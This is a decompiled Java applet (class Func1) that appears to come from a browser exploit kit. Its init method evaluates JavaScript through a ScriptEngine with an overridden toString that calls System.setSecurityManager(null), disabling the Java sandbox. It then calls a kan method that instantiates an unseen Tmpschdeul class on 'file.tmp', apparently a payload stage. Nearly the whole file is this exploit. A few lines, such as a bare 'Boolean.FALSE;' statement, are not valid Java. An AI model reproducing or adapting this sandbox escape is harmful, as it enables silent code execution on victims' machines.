import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import javax.script.ScriptEngineManager;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Func1 extends Applet
{
    private boolean done;
    
    public Func1() {
        this.done = Boolean.FALSE;
    }
    
    @Override
    public void init() {
        try {
            final boolean booleanValue = Boolean.FALSE;
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName("js");
            engineByName.put("applet", this);
            if (booleanValue) {
                Boolean.FALSE;
            }
            this.add(new JList<Object>(new Object[] { engineByName.eval("function toString(){Packages.java.lang.System.setSecurityManager(null); applet.kan();return 'WRONG!'};function scltk(){var mierror = new Error(); mierror.message = this; return mierror;}; scltk();") }));
        }
        catch (ScriptException ex) {
            ex.printStackTrace();
        }
    }
    
    public void kan() {
        if (!this.done) {
            final Tmpschdeul tmpschdeul = new Tmpschdeul("file.tmp");
            this.done = Boolean.TRUE;
        }
    }
}
